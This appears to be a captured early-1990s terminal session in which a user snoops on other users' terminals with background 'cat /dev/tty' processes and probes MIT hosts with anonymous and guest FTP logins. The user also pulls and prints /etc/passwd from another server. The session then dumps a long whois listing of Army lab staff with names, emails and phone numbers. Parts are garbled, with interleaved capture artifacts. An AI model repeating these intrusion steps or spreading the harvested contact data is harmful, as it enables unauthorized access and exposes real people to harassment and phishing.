cat /dev/ttyp5>5&
[5] 27437
bash$ ftp
ftp> o jupiter.ai.mit
ejupiter.ai.mit: unknown host
ftp> d
?Invalid command
ftp> o jupiter.ai.mit.edu

<< DOS Shell >>. Type 'EXITÙ' to return to Telix.
ftp: connect: Connection timed out
ftp> o notri-grain.ai.mit.edu
notri-grain.ai.mit.edu: unknown host
ftp> o nutri-grain.ai.mit.edu
Connected to nutri-grain.ai.mit.edu.
220 nutri-grain FTP server (SunOS 4.1) ready.
Name (nutri-grain.ai.mit.edu:psteffn): anonymous
331 Password required for anonymous.
Password:
530 Login incorrect.
Login failed.
ftp> u
(username) anonymous
530 User anonymous unknown.
Login failed.
ftp> close
221 Goodbye.
ftp> o oatma#eal.ai.mit.edu
oatma#eal.ai.mit.edu: unknown host
ftp> o oatmeal.ai.mit.edu
Connected to oatmeal.ai.mit.edu.
220 oatmeal FTP server (SunOS 4.1) ready.
Name (oatmeal.ai.mit.edu:psteffn): anonymous
530 User anonymous unknown.
Login failed.
ftp> u
(username) guest
331 Password required for guest.
Password: 
530 Login incorrect.
Login failed.
ftp> close
221 Goodbye.
ftp> o oreo.ai.mit.edu
Connected to oreo.ai.mit.edu.
220 oreo FTP server (SunOS 4.1) ready.
Name (oreo.ai.mit.edu:psteffn): anonymous
530 User anonymous unknown.
Login failed.
ftp> close
221 Goodbye.
ftp> o lyman.pppl.gov
lyman.pppl.gov: unknown host
ftp> o lyman.pppl.gov
Connected to lyman.pppl.gov.
220 lyman FTP server (SunOS 4.1) ready.
Name (lyman.pppl.gov:psteffn): anonymous
331 Guest login ok, send ident as password.
Password:
230 Guest login ok, access restrictions apply.
ftp> cd /etc
250 CWD command successful.
ftp> get passwd
200 PORT command successful.
150 ASCII data connection for passwd (128.52.46.26,1876) (250 bytes).
226 ASCII Transfer complete.
local: passwd remote: passwd
258 bytes received in 0.46 seconds (0.55 Kbytes/s)
ftp> close
221 Goodbye.
ftp> quit
bash$ cat passwd
root:GUESS:0:1:Operator:/:/bin/csh
nobody:*:65534:65534::/:
daemon:*:1:1::/:
sys:*:2:2::/:/bin/csh
bin:*:3:3::/bin:
ingres:*:7:7::/usr/ingres:/bin/csh
audit:*:9:9::/etc/security/audit:/bin/csh
ftp:*:28002:28000:Anonymous FTP:/usr/spool/ftp:/bin/sync
bash$ rm passwd
bash$ ps
who
  PID TT STAT  TIME COMMAND
27215 p0 S     0:06 -bash (bash)
27240 p0 I     0:00 cat /dev/ttyp6
27241 p0 I     0:00 cat /dev/ttyp8
27244 p0 I     0:00 cat /dev/ttyq0
27245 p0 I     0:00 cat /dev/ttyq1
27437 p0 I     0:00 cat /dev/ttyp5
27474 p0 R     0:00 ps
bash$ who
rootb    console  Aug  5 06:53
psteffn  ttyp0    Aug 19 02:54 (hal.gnu.ai.mit.e)
imcclogh ttyp1    Aug 18 17:39 (glia.biostr.wash)
jprovo   ttyp2    Aug 18 18:34 (gene.ummed.edu)
law      ttyp3    Aug  6 16:23 (128.110.4.17:0.0)
tami     ttyp7    Aug 18 13:15 (splinter.coe.nor)
info     ttyp9    Aug 18 16:43 (odin.cc.pdx.edu)
barry    ttwhois brl
Connecting to id Database . . . . . .
Connected to id Database
Aberdeen Proving Ground (BRL)
   Army Ballistic Research Laboratory (BRL)
   Aberdeen, MD 21005

   Hostname: BRL.MIL
   Nicknames: BRL.ARMY.MIL
   Address: 26.2.0.29
   System: VAX-11/785 running UNIX
   This host is authorized to request TAC cards

   Host Administrator:
      Reimer, Sonya P.  (SPR2)  sonya@BRL.MIL
      (410) 278-8676/6808 or (DSN) 298-8676/6808

   Record last updated on 04-Aug-92.

Would you like to see the registered users of this host? y


   There are 373 registered users:

Acord, Kenneth (KA33)           acord@BRL.MIL    (410) 278-6272 (DSN) 298-6272
Adams, George F. (GFA)          gfa@BRL.MIL      (410) 278-6197 (DSN) 298-6197
Adkins, Thomas C. (TCA)         adkins@BRL.MIL                  (410) 278-6564
Allen, Karin B. (KBA5)          kallen@BRL.MIL   (DSN) 298-6501 (410) 278-6501
Allen, Michael S. (MSA11)       msallen@AMSAA-CLEO.BRL.MIL
                                                 (DSN) 298-6410 (401) 278-6410
There are 368 more matches.  Show them? y
Allison, William D. (WDA2)      allison@BRL.MIL                 (410) 278-6027
Allison, William T. (WTA1)      WALLISON@BRL.MIL (410) 295-5236 (DSN) 295-5236
Amerg, Sharon (SA98)            amerg@BRL.MIL    (DSN) 298-6819 (410) 278-6819
Anderson, Joseph D. (JDA2)      andr@BRL.MIL     (410) 278-6299 (DSN) 298-6299
Anderson, Ronald D. (RDA3)      andy@BRL.MIL     (410) 278-6701 (DSN) 298-6701

----------

Angelini, Jeanne T. (JTA8)      jeanne@BRL.MIL   (410) 278-6976 (DSN) 298-6976
Angelini, Richard C. (RCA2)     ANGEL@BRL.MIL    (410) 278-6266 (DSN) 298-6266
Armstrong, Richard N. (RNA5)    narmstro@HEL4.BRL.MIL           (DSN) 558-3303
Atzinger, Erwin A. (EAA)        erwin@BRL.MIL    (410) 278-6576 (DSN) 298-6576
Baldwin, Linda D. (LDB8)        baldwin@BRL.MIL  (DSN) 298-6829 (410) 278-6929
Barb, James C. (JCB9)           jbarb@BRL.MIL                   (410) 278-6215
Barisano, Gregg A. (GAB22)      barisano@BRL.MIL (410) 278-2073, (DSN)298-2073
Barnhill, Thomas M. (TMB5)      barnhill@BRL.MIL                (410) 278-6561
Barrows, Austin W. (AWB4)       awb@BRL.MIL      (DSN) 298-6149 (410) 278-6149
Beard, Kay L. (KLB)             kay@BRL.MIL                     (410) 278-6001

----------

Benjamin, Kelly J. (KJB3)       kjm@BRL.MIL                     (410) 278-6241
Bennett, Don (DB66)             bennettd@HEL-PLESS.BRL.MIL
                                                       (703) 640-3351/3656/7/8
Benson, John O. (JOB12)         benson@BRL.MIL   (DSN) 298-6600 (410) 278-6600
Bernhardt, James E. (JEB11)     jeb@BRL.MIL                     (410) 278-2422
Berry, Constance L. (CB77)      cberry@HEL4.BRL.MIL
                                                 (DSN) 298-5952 (410) 278-5952
Beyer, Richard A. (RAB7)        BEYER@BRL.MIL                   (410) 278-6642
Bines, Alfred L. (ALB1)         bines@BRL.MIL                   (410) 278-6549
Bitting, Robert L. (RLB44)      bitting@BRL.MIL                 (301) 278-6024
Blackburn, Grat E. (GEB2)       geb@BRL.MIL                     (410) 278-6827
Blomquist, John (JB118)         jblom@BRL.MIL    (410) 278-6387 (DSN) 298-6387

----------

Blount, Michael D. (MDB1)       blount@BRL.MIL                  (410) 278-5484
Bohorfoush, Louis C., Jr. (LCB7)lcbohor@BRL.MIL                 (205) 254-2419
Bowen, Robert L. (RLB18)        rlbowen@BRL.MIL  (410) 278-6585 (DSN) 298-6585
Bowman, Dennis L. (DLB7)        dennis@BRL.MIL                  (410) 278-3905
Boyce, Gary L. (GLB2)           boyce@BRL.MIL                   (410) 278-6544
Boyle, Vincent M. (VMB1)        boyle@BRL.MIL                   (410) 278-6552
Bradley, Brad W. (BWB3)         bbradley@BRL.MIL (DSN) 298-6231 (410) 278-6231
Braerman, William F. (WFB2)     braer@BRL.MIL    (DSN) 298-6585 (410) 278-6585
Brainard, Lee Ann (LAB47)       leeann@BRL.MIL
                         (DSN) 298-6664 or 298-6668 (301) 278-6664 or 278-6668
Breaux, Harold J. (HJB10)       harold@BRL.MIL   (410) 278-6259 (DSN) 298-6259

----------

Brock, Vicki (VB8)              vickis@BRL.MIL   (410) 278-6679 (DSN) 298-6679
Broome, Barbara D. (BDB1)       bdbroome@BRL.MIL (DSN) 298-8950 (410) 278-8950
Broome, Paul (PB12)             broome@BRL.MIL   (410) 278-6883 (DSN) 298-6883
Bruchey, William J., Jr. (WB10) bruchey@BRL.MIL  (410) 278-6223 (DSN) 298-6223
Brundick, Frederick S. (FSB1)   fsbrn@BRL.MIL    (410) 298-3091 (DSN) 278-3091
Buchanan, James R. (JRB79)      buchanan@BRL.MIL (DSN) 298-6600 (410) 278-6600
Buchanan, John (JB7498)         buchnan@BRL.MIL                   301-295-5234
Buchanan, John W. (JWB48)       BUCHNAN@BRL.MIL  (410) 295-5234 (DSN) 295-5234
Bulmash, Gerald (GB29)          BULMASH@BRL.MIL                 (410) 278-3368
Bunte, Steven W. (SWB)          BUNTE@BRL.MIL                   (410) 278-6642

----------

Burdeshaw, Mark D. (MDB57)      markb@BRL.MIL    (DSN) 298-6254 (410) 278-6254
Burke, Kathy A. (KAB36)         kburke@BRL.MIL   (301) 278-9279 (DSN) 298-9279
Burns, Bruce B. (BBB2)          burns@BRL.MIL    (410) 278-6130 (DSN) 298-6130
Butler, Lee A. (LAB5)           butler@BRL.MIL   (410) 278-9200 (DSN) 298-9200
Cahoon, Robert M. (RMC3)        RMC@BRL.MIL                     (410) 278-6320
Carlineo, John D. (JDC7)        carlineo@BRL.MIL (410) 278-7284 (DSN) 298-7284
Carlock, Jack (JC427)           jcarlock@PICA.ARMY.MIL          (DSN) 880-3227
Carothers, Reba A. (RAC74)      rcarothe@HEL4.BRL.MIL
                                                 (DSN) 298-5794 (410) 278-5794
Carroll, Richard G. (RGC3)      carroll@BRL.MIL                 (410) 278-4118
Cartland, Harry E. (HEC5)       hcartlan@BRL.MIL  (DSN) 298-7069 (410)278-7069

----------

Caton, Howell (HC4)             caton@BRL.MIL    (410) 278-6337 (DSN) 298-6337
Chabalowski, Cary F. (CFC10)    cary@BRL.MIL     (410) 278-6095 (DSN) 298-6095
Chaillou, Kathy M. (KC52)       chaillou@BRL.MIL (301) 278-6958 (DSN) 298-6958
Chamberlain, Samuel C. (SCC)    wildman@BRL.MIL  (410) 278-8948 (DSN) 298-8948
Chizmar, Steve (STC2)           chizmar@BRL.MIL  (410) 278-6586 (DSN) 298-6586
Clay, William P. (WPC3)         WPCLAY@BRL.MIL   (410) 278-6418 (DSN) 298-6418
Coates, Randolph S. (RSC3)      rcoates@BRL.MIL                 (410) 278-6084
Cohen, Martin (MC34)            mcohen@BRL.MIL
                                             (215) 597-8377 (DSN)444-3808/3809
Coleman, Monte W. (MWC)         Coleman@BRL.MIL  (410) 278-6261 (DSN) 298-6261
Collier, Richard S. (RSC21)     collier@BRL.MIL                 (303) 980-0070

----------

Comstock, Gary (GC172)          comstock@BRL.MIL (410) 278-2079 (DSN) 298-2079
Conley, Lori (LC63)             lac@BRL.MIL      (DSN) 298-6411 (410) 278-6411
Conley, Mary Katherine (MKK3)   maryc@BRL.MIL    (410) 278-8774 (DSN) 298-8774
Cook, Thomas (TC123)            tcook@HEL4.BRL.MIL              (DSN) 746-2048
Cooper, A. Brinton, III (ABC4)  abc@BRL.MIL      (410) 278-6883 (DSN) 298-6883
Copland, Allister (AC28)        copland@BRL.MIL                 (410) 278-6566
Cregar, Raymond D. (RDC4)       cregar@BRL.MIL                  (410) 278-2811
Crimmins, Thomas W. (TWC)       CRIMMINS@BRL.MIL (410) 278-6272 (DSN) 298-6267
Cullum, John Wayne (JWC7)       duke@BRL.MIL     (410) 278-6567 (DSN) 298-6567
Cummings, Benjamin E. (BEC)     bigben@BRL.MIL   (DSN) 298-5811 (410) 278-5811

----------

Danberg, James (JD98)           DANBERG@BRL.MIL  (410) 278-4280 (FTS) 987-4280
Dante, James C. (JCD2)          dante@BRL.MIL                   (410) 278-6701
Das Gupta, Aaron (AD20)         dasgupta@BRL.MIL                (410) 278-6026
Davidson, Donald R., Jr. (DRD11)drd@HEL-ACE.BRL.MIL
                                                 (410) 278-5883 (DSN) 298-5883
Davis, Edward G. (EGD7)         edavis@BRL.MIL   (410) 278-6309 (DSN) 298-6309
Davisson, Edwin O. (EOD)        davisson@BRL.MIL (410) 278-6711 (DSN) 298-6711
DeFrank, Thomas M. (TMD22)      tdefrank@BRL.MIL (DSN) 298-4450 (410) 278-4450
Deal, Eleanor C. (ECD)          deal@BRL.MIL                    (410) 278-6953
Deemer, Robert (RD327)          rdeemer@BRL.MIL
                                            (215) 597-8377 (DSN) 444-3808/3809
Dehn, James T. (JTD3)           dehn@BRL.MIL                    (410) 278-6020

----------

Deitz, Paul H. (PHD)            phd@BRL.MIL
                         (410) 278-6656 or 278-6644 (DSN) 298-6656 or 298-6644
Dempsey, Hugh A. L. (HALD)      hugh@BRL.MIL     (804) 728-5822 (DSN) 680-5822
Devynck, Didier (DD298)         devynck@BRL.MIL  (DSN) 298-6100 (410) 278-6100
Di Rocco, Anthony Charles (RAD16) acvd@AMSAA-CLEO.BRL.MIL
                                                 (DSN) 298-6406 (410) 278-6406
Diehl, Gloria J. (GJD2)         gdiehl@BRL.MIL                  (410) 278-6952
Dietrich, Andrew (AD9)          DREW@BRL.MIL                    (410) 278-6049
Dolby, Michael (MD216)          dolby@BRL.MIL    (DSN) 298-5026 (410) 278-5026
Dombeck, Norman J. (NJD)        DOMBECK@BRL.MIL  (410) 278-6379 (DSN) 298-6379
Dorney, Al (AD93)               adorney@HEL4.BRL.MIL
                                                 (410) 278-4543 (DSN) 298-4543
Dorsey, Toni M. (TMD)           tmt@BRL.MIL                     (410) 278-6209

----------

Dousa, William J. (WJD1)        billy@BRL.MIL
                         (DSN) 298-5886 or 298-5888 (410) 278-5886 or 278-5888
Drake, Denise J. (DJD47)        denise@BRL.MIL   (DSN) 298-6407 (410) 278-6407
Drummond, William T., Jr. (WTD1)drummond@BRL.MIL
                             (DSN) 639-2846/6400/3368 (405) 375-2846/6400/3368
Duffy, Mary L. (MLD)            mduffy@BRL.MIL                  (410) 278-6826
Dumer, John C., III (JCD)       dumer@BRL.MIL    (410) 278-4540 (DSN) 298-4540
Dykstra, Phillip Cecil (PCD3)   phil@BRL.MIL     (410) 278-6808 (DSN) 298-6808
Dymond, Marguerite M. (MMD3)    dymond@BRL.MIL   (DSN) 298-6356 (410) 278-6356
Edwards, Albert G., IV (AGE4)   tadster@BRL.MIL  (DSN) 298-6330 (410) 278-6330
Ege, Joan (JE2)                 EGE@BRL.MIL
                                  (410) 278-6265 (DSN) 298-6265 (FTS) 939-6265
Ellis, David M. (DME3)          ELLIS@BRL.MIL    (410) 278-6818 (DSN) 298-6818

----------

Elmore, Kenneth P. (KPE)        kelmore@BRL.MIL                 (314) 291-8685
Farrand, Timothy G. (TGF2)      farrand@BRL.MIL                 (410) 278-6558
Feeney, Joseph J. (JJF17)       jfeeney@HEL4.BRL.MIL
                                                 (DSN) 298-8620 (410) 278-8620
Ferry, Hans-Michael T. (HTF)    ferry@BRL.MIL    (410) 278-6325 (DSN) 298-6325
Fickie, Kurt D. (KDF)           FICKIE@BRL-IBD.MIL
                                     (DSN) 298-6858 (410) 278-6858 or 278-6678
Fielding, James L. (JLF5)       jamesf@BRL.MIL
                                        (301) 278-6664/6668 DSN: 298-6664/6668
Fifer, Robert A. (RAF16)        fifer@BRL.MIL    (410) 278-6806 (DSN) 298-6806
Filbey, Gordon (GF8)            SKIP@BRL.MIL                    (410) 278-6081
Finanger, Karl T. (KTF1)        finanger@BRL.MIL (410) 278-6975 (DSN) 298-6975
Finnerty, Anthony E. (AEF1)     finnerty@BRL.MIL                (410) 278-6572

----------

Fletcher, Brenda J. (BJF1)      fletcher@BRL.MIL (DSN) 298-8675 (410) 278-8675
Fox, Frank (FF8)                ffox@BRL.MIL     (DSN) 298-6591 (410) 278-6591
Frank, Konrad (KF2)             kfrank@BRL.MIL                  (410) 278-6021
Frasier, John T. (JTF19)        SLCBR@BRL.MIL    (DSN) 298-6244 (301) 278-6244
Freedman, Eli (EFF)             ELI@BRL.MIL                     (301) 278-6184
Frey, Robert B. (RBF1)          rbf@BRL.MIL                     (410) 278-6543
Frost, Samuel (SF54)            samf@BRL.MIL     (410) 278-6665 (DSN) 298-6665
Frounfelker, Kim R. (KRF13)     kimf@AMSAA.BRL.MIL
                                              (DSN) 298-2149 or (410) 278-2149
Gajdalo, Steve (SG203)          gajdalo@BRL.MIL
                                            (215) 597-8377 (DSN) 444-3808/3809
Galbavy, Al (AG16)              agalbavy@HEL4.BRL.MIL           (DSN) 960-4277

----------

Gamliel, Ehud (EG59)            GAMLIEL@BRL.MIL  (410) 295-1597 (DSN) 295-1597
Gazonas, George A. (GAG11)      gazonas@BRL.MIL  (DSN) 298-4616 (410) 278-4616
Geddie, James (JCG10)           jgeddie@HEL4.BRL.MIL            (DSN) 738-9917
Gibbons, Gould, Jr. (GG22)      gibbons@BRL.MIL                 (410) 278-6551
Gilbert, David (DG43)           daveg@BRL.MIL    (410) 278-6600 (DSN) 298-6600
Gillich, William (WG7)          WGILLICH@BRL.MIL                (410) 278-6079
Goodwin, Juanita (JG284)        jgoodwin@HEL4.BRL.MIL           (DSN) 298-5813
Gotwals, Edwin (EG113)          gotwals@BRL.MIL
                                            (215) 597-8377 (DSN) 444-3808/3809
Grace, Fred (FG7)               GRACE@BRL.MIL                   (410) 278-6060
Gregory, Fred H. (FHG)          fgregory@BRL.MIL                (410) 278-6040

----------

Griffey, Nelda L. (NLG6)        NELDA@BRL.MIL
                                       (410) 278-3718/2692 (DSN) 298-3718/2692
Gross, David L. (DLG56)         dgross@HEL4.BRL.MIL
                                                 (DSN) 298-8625 (410) 278-8625
Gross, Michael (MG201)          mgross@BRL.MIL   (410) 278-6998 (DSN) 298-6998
Guidos, Bernard J. (BJG4)       GUIDOS@BRL.MIL   (410) 278-5436 (FTS) 987-5436
Hanes, Phillip J. (PJH4)        jeffh@BRL.MIL    (DSN) 298-6647 (410) 278-6647
Hanford, Charles C. (CCH3)      chanford@BRL.MIL                (314) 291-8685
Hanisch, Robert J. (RJH34)      hanisch@@STSCI.EDU              (410) 338-4910
Hanna, George M. (GMH1)         georgem@BRL.MIL  (DSN) 298-6620 (410) 278-6620
Hanratty, Timothy P. (TPH)      hanratty@BRL.MIL (410) 278-3084 (DSN) 298-3084
Harris, Frederick T. (FTH)      harris@BRL.MIL                  (410) 278-4118

----------

Harris, Jeanette M. (JHH33)     jmharris@BRL.MIL (410) 295-1598, (DSN)295-1598
Harrison, John T. (JTH1)        jth@BRL.MIL                     (410) 278-6071
Hartwig, George William, Jr. (GH1) geo@BRL.MIL   (410)-278-6668 (DSN) 298-6668
Haskell, Donald F. (DFH1)       hask@BRL.MIL     (410) 278-2032 (DSN) 298-2032
Hauver, George E. (GEH2)        hauver@BRL.MIL                  (410) 278-6052
Havel, Thomas (TH5)             TAH@BRL.MIL                     (410) 278-6080
Heavey, Karen R. (KRH1)         HEAVEY@BRL.MIL   (410) 278-3966 (FTS) 987-3966
Helfman, Richard A. (RAH6)      helfman@BRL.MIL  (410) 278-6657 (DSN) 298-6657
Herron, Roger A. (RAH1)         HERRON@BRL.MIL
                                  (410) 278-6348 (DSN) 298-6348 (FTS) 939-6348
Hill, Patrick Eugene (PEH1)     PHILL@BRL.MIL
                                       (410) 278-6669/6675 (DSN) 298-6669/6675

----------

Hillstrom, Warren W. (WWH1)     wwh@BRL.MIL                     (410) 278-6571
Hindman, Tracy P. (TPH3)        hindman@BRL.MIL  (DSN) 298-6344 (410) 278-6344
Hirschberg, Morton A. (MAH67)   mort@BRL.MIL     (410) 278-6661 (DSN) 298-6661
Hisley, Dixie M. (DMH5)         HISLEY@BRL.MIL                  (410) 278-6039
Hodge, David C. (DCH19)         dchodge@BRL.MIL  (410) 278-5865 (DSN) 298-5865
Hodge, Don (DH42)               DHODGE@BRL.MIL   (410) 278-6597 (DSN) 298-6597
Holtzberry, Edwin (ED)          tdees@BRL.MIL
Hopkins, David A. (DAH36)       hopkins@BRL.MIL                 (410) 278-6124
Horley, Gary L. (GLH4)          horley@BRL.MIL
                         (DSN) 298-5887 or 298-5889 (410) 278-5887 or 278-5889
Horst, Albert W. (AWH1)         horst@BRL.MIL    (410) 278-6202 (DSN) 298-6202

----------

Howard, Stephen L. (SLH29)      showard@BRL.MIL  (410) 278-6098 (DSN) 298-6098
Hutchison, Arthur (AH193)       hutch@BRL.MIL
                                            (215) 597-8377 (DSN) 444-3808/3809
Jacobson, John R. (JRJ2)        jake@BRL.MIL     (410) 278-6306 (DSN) 298-6306
Johnson, Andrew W. (AWJ)        aj@BRL.MIL                      (410) 278-6103
Johnson, Rodger W. (RWJ1)       rjohnson@BRL.MIL (DSN) 298-6484 (410) 278-6484
Juarascio, Stephanie S. (SSJ1)  snead@BRL.MIL    (410) 278-6341 (DSN) 298-6341
Juhasz, Arpad A. (AAJ4)         juhasz@BRL.MIL   (410) 278-6158 (DSN) 298-6158
Kaplan, Alan (AK103)            kaplan@BRL.MIL
                                            (215) 597-8377 (DSN) 444-3808/3809
Kaste, Pamela J. (PJK10)        duff@BRL.MIL      (DSN) 298-6168 (410)278-6168
Kaste, Richard C. (RCK9)        rck@BRL.MIL       (DSN) 298-9065 (410)278-9065

----------

Kaste, Virginia A. (VAK4)       ginny@BRL.MIL    (DSN) 298-6672 (410) 278-6672
Kauffman, Brenda L. (BLK13)     kauffman@BRL.MIL  (DSN) 298-6000 (410)278-6000
Keller, George E. (GEK)         KELLER@BRL.MIL   (410) 278-6190 (DSN) 298-6190
Kennedy, Charles M. (CMK)       KERMIT@BRL.MIL   (410) 278-6640 (DSN) 298-6640
Kile, Thomas G. (TGK7)          tgkile@BRL.MIL
                                      (410) 278-8676/6808  (DSN) 298-8676/6808
Kim, Dong S. (DSK)              SKIM@BRL.MIL     (410) 295-1623 (DSN) 295-1623
Kimsey, Kent D. (KDK1)          kimsey@BRL.MIL                  (410) 278-6017
Kindley, Barbara (BK108)        bkindley@BRL.MIL (DSN) 298-6277 (410) 278-6277
Kineke, John H., Jr. (JJK5)     kineke@BRL.MIL                  (410) 278-6067
Kingery, Charles N. (CNK)       kingery@BRL.MIL                 (410) 278-4914

----------

Kingman, Priscilla W. (PWK)     PATK@BRL.MIL                    (410) 278-6047
Kinney, Thomas E. (TEK)         tek@HEL-ACE.BRL.MIL
                                                 (DSN) 639-1219 (405) 351-1219
Kirk, Daniel P. (DPK3)          dkirk@BRL.MIL    (410) 278-6317 (DSN) 298-6317
Kitchens, Clarence (CK1)        KITCHENS@BRL.MIL                (410) 278-6004
Klem, George J. (GJK1)          KLEM@BRL.MIL                    (410) 278-6105
Klimack, William K. (WEK4)      klimack@BRL.MIL  (410) 278-5661 (DSN) 298-5661
Kotkin, Meyer (MK253)           kotkin@BRL.MIL
                                            (215) 597-8377 (DSN) 444-3808/3809
Kramar, John (JK49)             jkramar@BRL.MIL  (410) 278-6604 (DSN) 298-6640
Kregel, Mark D. (MDK9)          mark@BRL.MIL     (DSN) 298-7997 (410) 278-7997
Kreisel, Robert G., Jr. (RGK1)  kreisel@BRL.MIL   (410) 278-7291 (AV) 298-7291

----------

Krogh, Richard V. (RVK)         dink@HEL-ACE.BRL.MIL
                                                 (DSN) 298-5878 (410) 278-5878
Kruse, W. Karl (WKK3)           kkruse@BRL.MIL
                                            (215) 597-8377 (DSN) 444-3808/3809
Kurian, Alexander V. (AVK)      kurian@BRL.MIL                  (410) 278-3061
Kysor, Kragg Philip (KKP)       kysor@BRL.MIL
                         (DSN) 298-5888 or 298-5873 (410) 278-5873 or 278-5888
Lampson, Miles (ML15)           LAMPSON@BRL.MIL                 (410) 278-6807
Lapointe, Claude (CL8)          LAPOINT@BRL.MIL  (410) 278-6270 (DSN) 298-6270
Larkin, Ruth A. (RAL4)          larkin@BRL-AOS.MIL              (DSN) 298-3966
Lieb, Robert J. (RJL8)          rlieb@BRL.MIL    (410) 278-6195 (DSN) 298-6195
Lince, Donald L. (DLL2)         dll@HEL-PLESS.BRL.MIL
                                                 (DSN) 298-5875 (410) 278-5875
Littleton, Eric C. (ECL11)      elittle@BRL.MIL  (DSN) 298-6600 (410) 278-6600

----------

Lottero, Richard E. (REL4)      LOTTERO@BRL.MIL                 (410) 278-6035
Lyman, Ona R. (ORL)             lyman@BRL.MIL                   (410) 278-6208
Magness, Lee S. (LSM)           magness@BRL.MIL                 (410) 278-6022
Malinoski, Frederick A. (FAM1)  fam@BRL.MIL                     (410) 278-6078
Mance, Tony (TM179)             tmance@HEL4.BRL.MIL             (DSN) 693-3070
Mark, Andrew (AM13)             AMARK@BRL.MIL                   (410) 278-6030
Martin, John (JM607)            jmartin@HEL4.BRL.MIL
                                                 (201) 554-4866 (DSN) 995-3649
Maulbetsch, Roy D. (RDM4)       rdm@BRL.MIL                     (410) 278-6949
McCarthy, John (JM148)          jjmc@BRL.MIL     (410) 278-6593 (DSN) 298-6593
McCoy, Curtis L. (CLM32)        cmccoy@BRL.MIL   (DSN) 298-9075 (410) 278-9075

----------

McFadden, Doenee L. (DLM2)      dlm@BRL.MIL                     (410) 278-6207
McGee, Richard A. (RAM8)        dickmc@BRL.MIL   (410) 278-4180 (DSN) 298-4180
McGill, Robert L. (RLM11)       mcgill@BRL.MIL                  (410) 278-2745
McKean, Richard Earl (REM13)    ARTYCD@BRL.MIL   (DSN) 639-3716/3803/4451/6902
McMullen, Renee (RM226)         renee@BRL.MIL    (DSN) 298-6272 (410) 278-6272
McNesby, Kevin L. (KLM22)       mcnesby@BRL.MIL  (410) 278-6163 (DSN) 298-6163
Meredith, John L. (JLM16)       jlmj@BRL.MIL     (DSN) 298-6405 (410) 278-6405
Mermagen, William H., Jr. (WHM1)wm@BRL.MIL       (DSN) 298-8740 (410) 278-8740
Merritt, Donald F. (DFM1)       merritt@BRL.MIL  (410) 278-6808 (DSN) 298-6808
Meyer, Hubert W., Jr. (HWM2)    meyer@BRL.MIL                   (410) 278-6019

----------

Mikhail, Ameer G. (AGM4)        MIKHAIL@BRL.MIL  (410) 278-3773 (FTS) 987-3773
Miller, Michael R. (MRM40)      mmiller@HEL4.BRL.MIL
                                                 (DSN) 298-8623 (410) 278-8623
Minor, Thomas C. (TCM2)         TMINOR@BRL.MIL                  (410) 278-6176
Miranda, Kathleen A. (KAM7)     miranda@BRL.MIL  (DSN) 298-6668 (410) 278-6668
Moore, Carl G., Jr. (CGM2)      cmoore@BRL.MIL
                                  (410) 278-6663 (DSN) 298-6663 (FTS) 939-6663
Morrissey, John A. (JAM9)       lex@BRL.MIL      (401) 278-6326 (DSN) 298-6326
Moss, Gary S. (GSM1)            moss@BRL.MIL     (410) 278-2979 (DSN) 298-2979
Muller, Peter (PM43)            muller@BRL.MIL                  (410) 278-3368
Murray, Karen Ross (KER)        KAREN@BRL.MIL                   (410) 278-6647
Muuss, Michael John (MJM2)      MIKE@BRL.MIL
                         (410) 278-6678 or 278-6656 (DSN) 298-6678 or 298-6656

----------

Muuss, Susanne Louise (SLM35)   sue@BRL.MIL      (410) 278-3765 (DSN) 298-3765
Myers, Keith (KM37)             kmyers@BRL.MIL   (410) 278-6614 (DSN) 298-6614
Neades, David N. (DNN)          dave@BRL.MIL                    (410) 278-6335
Nguyen, Hung M. (HMN1)          mhung@BRL.MIL                   (703) 664-4074
Nielsen, Gerald D. (GDN1)       gdniels@BRL.MIL  (410) 278-4974 (DSN) 298-4974
Nietubicz, Charles J. (CJN)     CJN@BRL.MIL      (410) 278-3691 (FTS) 987-3691
Norman, Peter W. (PWN)          PNORMAN@BRL.MIL  (410) 278-6541 (DSN) 298-6541
O'May, Janet F. (JFO13)         jomay@BRL.MIL                   (301) 278-3430
Oberle, William F., III (WIO3)  oberle@BRL.MIL   (DSN) 298-6200 (410) 278-6200
Oegerle, William R. (WRO3)      oegerle@@STSCI.EDU              (410) 338-4744

----------

Orr, Donald (DO86)              donorr@BRL.MIL
                                            (215) 597-8377 (DSN) 444-3808/3809
Parker, Patricia (PP43)         parker@@STSCI.EDU               (410) 338-4763
Paszek, John J. (JJP5)          paszek@BRL.MIL                  (410) 278-5713
Patel, Nisheeth (NP14)          PATEL@BRL.MIL    (410) 278-6704 (DSN) 298-6704
Paxton, Carl V. (CVP)           paxton@BRL.MIL                  (410) 278-4437
Payne, David (DP249)            drp@BRL.MIL      (DSN) 298-6867 (410) 278-6867
Payne, Shirley A. (SAP25)       spayne@HEL4.BRL.MIL
                                                 (DSN) 298-6828 (410) 278-6828
Perala, Chuck H. (CHP7)         cperala@HEL4.BRL.MIL
                                                 (410) 278-5818 (DSN) 298-5818
Petresky, John J., Jr. (JJP28)  petresky@BRL.MIL (DSN) 298-6704 (410) 278-6704
Phillabaum, Robert A. (RAP1)    bap@BRL.MIL                     (410) 278-6010

----------

Phillips, Dennis P. (DPP3)      dennisp@BRL.MIL  (410) 278-2344 (DSN) 298-2344
Pilarski, Deborah L. (DLP6)     pilarski@BRL.MIL                (410) 278-6547
Pliscof, Marc S. (MSP10)        marco@BRL.MIL    (DSN) 298-6425 (410) 278-6425
Polk, John F. (JFP3)            polk@BRL.MIL                    (410) 278-6554
Prenatt, Raymond E. (REP10)     ned@BRL.MIL
                                  (DSN) 298-6665 (410) 278-6665 (FTS) 939-6665
Pressley, Anthony L. (ALP2)     apress@BRL.MIL   (410) 278-6509 (DSN) 298-6509
Pritchard, Dennis S. (DSP2)     dprit@BRL.MIL                   (410) 278-6045
Propst, Mark (MP163)            propst@BRL.MIL   (410) 278-8721 (DSN) 298-8721
Puckett, Lawrence J. (LPP)      lpuckett@BRL.MIL (30l) 278-6246 (DSN) 298-6246
Purnell, Terry A. (TAP1)        purn@BRL.MIL     (410) 278-6336 (DSN) 298-6336

----------

Quay, Glenn R. (GRQ)            quay@BRL.MIL                    (410) 278-3061
Quigley, Ennis F. (EFQ)         ennis@BRL.MIL    (410) 278-6710 (DSN) 298-6710
Raley, Robert J. (RJR4)         raley@BRL.MIL                   (410) 278-4912
Ralston, Mark H. (MHR1)         ralston@BRL.MIL  (410) 278-6344 (DSN) 298-6344
Randers-Pehrson, Glenn (GR8)    GLENNRP@BRL.MIL  (410) 278-6554 (DSN) 298-6554
Rapacki, Edward J. (EJR1)       rapacki@BRL.MIL                 (410) 278-6219
Rapp, James R. (JRR1)           rapp@BRL.MIL     (410) 278-3156 (DSN) 298-3156
